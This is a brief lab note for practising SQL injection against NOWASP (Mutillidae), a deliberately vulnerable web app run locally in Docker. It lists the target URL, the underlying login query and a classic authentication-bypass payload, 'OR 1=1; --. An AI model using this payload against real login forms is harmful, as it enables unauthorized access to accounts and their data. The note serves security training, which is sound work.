# Environment: docker pull citizenstig/nowasp

# Target
# http://localhost/index.php?page=user-info.php&username=&password=&user-info-php-submit-button=View+Account+Details

# Original Query
SELECT * FROM accounts WHERE username='iwasday' AND password=''

# SQL Injection
'OR 1=1; -- 